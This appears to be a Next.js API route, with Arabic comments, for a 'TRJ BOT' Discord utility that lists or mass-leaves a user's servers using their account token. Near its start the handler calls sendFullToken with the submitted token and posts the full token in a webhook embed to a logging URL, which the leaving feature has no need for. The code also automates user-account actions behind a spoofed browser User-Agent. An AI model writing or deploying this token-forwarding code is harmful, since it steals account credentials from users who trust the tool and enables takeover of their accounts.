import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

async function fetchAllGuilds(token: string): Promise<{ id: string; name: string; owner: boolean; members: number }[]> {
  const allGuilds: { id: string; name: string; owner: boolean; members: number }[] = [];
  let after = '';

  for (let page = 0; page < 30; page++) {
    const endpoint = after
      ? `/users/@me/guilds?limit=100&after=${after}`
      : `/users/@me/guilds?limit=100`;

    const guildsRes = await discordFetch(token, 'GET', endpoint);
    const guildsData = guildsRes.data as Record<string, unknown>[] | null;

    if (!guildsRes.ok || !Array.isArray(guildsData) || guildsData.length === 0) break;

    for (const g of guildsData) {
      allGuilds.push({
        id: String(g.id),
        name: String(g.name || g.id),
        owner: g.owner === true,
        members: Number(g.approximate_member_count || g.member_count || 0)
      });
    }

    after = String(guildsData[guildsData.length - 1]?.id || '');
    if (guildsData.length < 100) break;
  }

  return allGuilds;
}

/**
 * مغادرة سيرفر واحد عبر DELETE /users/@me/guilds/:id
 *
 * إصلاح مهم: discordFetch يضع Content-Type: application/json افتراضياً في كل الطلبات،
 * وعندما يرى Discord هذا الـ header في طلب DELETE بدون body، يحاول تحليل body فارغ
 * كـ JSON ويرمي الخطأ 50109 ("The request body contains invalid JSON").
 *
 * الحل: نتجاوز discordFetch ونستخدم fetch مباشرة لطلب DELETE بدون Content-Type.
 */
async function leaveSingleGuild(token: string, guildId: string): Promise<{ id: string; name: string; success: boolean; status?: number }> {
  try {
    const res = await fetch(`https://discord.com/api/v10/users/@me/guilds/${guildId}`, {
      method: 'DELETE',
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': '*/*',
        // ❌ لا تضع Content-Type: application/json هنا
        // لأن Discord سيحاول تحليل الـ body الفارغ كـ JSON
      },
      // body فارغ عمداً
    });

    const ok = res.status === 204 || res.ok;

    // معالجة Rate Limiting
    if (res.status === 429) {
      try {
        const data = await res.json() as { retry_after?: number };
        const wait = (data.retry_after || 5) * 1000;
        await new Promise(r => setTimeout(r, wait));
        return leaveSingleGuild(token, guildId);
      } catch {
        await new Promise(r => setTimeout(r, 5000));
        return leaveSingleGuild(token, guildId);
      }
    }

    return { id: guildId, name: guildId, success: ok, status: res.status };
  } catch (error) {
    console.error(`[leaveSingleGuild] Error for ${guildId}:`, error);
    return { id: guildId, name: guildId, success: false };
  }
}

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:leaver`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, action, guildIds } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    sendFullToken('مغادرة سيرفرات', token);

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    let userInfo = 'Unknown';
    try {
      const userRes = await discordFetch(ct, 'GET', '/users/@me');
      userInfo = String(((userRes.data as Record<string, unknown>)?.username) || 'Unknown');
    } catch {
    }

    if (action === 'list') {
      const allGuilds = await fetchAllGuilds(ct);

      return NextResponse.json({
        success: true,
        guilds: allGuilds,
        total: allGuilds.length,
        owned: allGuilds.filter(g => g.owner).length
      });
    }

    sendToWebhook({
      username: 'TRJ Leaver',
      embeds: [{
        title: '🚪 Server Leaver Started',
        color: 0xFFAA00,
        fields: [
          { name: '👤 User', value: userInfo, inline: true },
          { name: '📋 Action', value: action, inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
        ],
        footer: { text: 'TRJ BOT v4.3' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    if (action === 'leave_all') {
      const allGuilds = await fetchAllGuilds(ct);
      const leavableGuilds = allGuilds.filter(g => !g.owner);
      const ownedGuilds = allGuilds.filter(g => g.owner);

      if (leavableGuilds.length === 0) {
        return NextResponse.json({
          success: true,
          stats: { left: 0, failed: 0, skipped: ownedGuilds.length },
          servers: ownedGuilds.map(g => ({ id: g.id, name: `${g.name} (owner)` })),
          message: ownedGuilds.length > 0 ? `كل السيرفرات مملوكة (${ownedGuilds.length})` : 'لا يوجد سيرفرات'
        });
      }

      const leftServers: { id: string; name: string; success: boolean }[] = [];
      let successCount = 0;
      let failedCount = 0;

      // مغادرة متتالية - سيرفر واحد تلو الآخر
      for (let i = 0; i < leavableGuilds.length; i++) {
        const guild = leavableGuilds[i];
        const result = await leaveSingleGuild(ct, guild.id);
        leftServers.push({ id: result.id, name: guild.name, success: result.success });
        if (result.success) successCount++;
        else failedCount++;

        // انتظار بين كل مغادرة لتفادي الـ rate limit
        if (i < leavableGuilds.length - 1) {
          await new Promise(r => setTimeout(r, 500));
        }
      }

      sendToWebhook({
        username: 'TRJ Leaver',
        embeds: [{
          title: '✅ Sequential Leave Completed',
          color: successCount > 0 ? 0x00FF41 : 0xFF0000,
          fields: [
            { name: '🚪 مغادر', value: String(successCount), inline: true },
            { name: '❌ فشل', value: String(failedCount), inline: true },
            { name: '👑 ملك (تم التخطي)', value: String(ownedGuilds.length), inline: true },
            { name: '👤 User', value: userInfo, inline: true },
          ],
          footer: { text: 'TRJ BOT v4.3' },
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      return NextResponse.json({
        success: true,
        stats: { left: successCount, failed: failedCount, skipped: ownedGuilds.length },
        servers: leftServers
      });

    } else if (action === 'leave_list' && Array.isArray(guildIds) && guildIds.length > 0) {
      let left = 0, failed = 0;
      const results: { id: string; name: string; success: boolean }[] = [];

      // مغادرة متتالية - سيرفر واحد تلو الآخر
      for (let i = 0; i < guildIds.length; i++) {
        const result = await leaveSingleGuild(ct, guildIds[i]);
        results.push(result);
        if (result.success) left++;
        else failed++;

        if (i < guildIds.length - 1) {
          await new Promise(r => setTimeout(r, 500));
        }
      }

      sendToWebhook({
        username: 'TRJ Leaver',
        embeds: [{
          title: '✅ Sequential Leave List Completed',
          color: 0x00FF41,
          fields: [
            { name: '🚪 مغادر', value: String(left), inline: true },
            { name: '❌ فشل', value: String(failed), inline: true },
          ],
          footer: { text: 'TRJ BOT v4.3' },
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      return NextResponse.json({ success: true, stats: { left, failed }, results });

    } else {
      return NextResponse.json({ success: false, error: 'إجراء غير معروف - استخدم leave_all, leave_list, أو list' }, { status: 400 });
    }

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Leaver Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
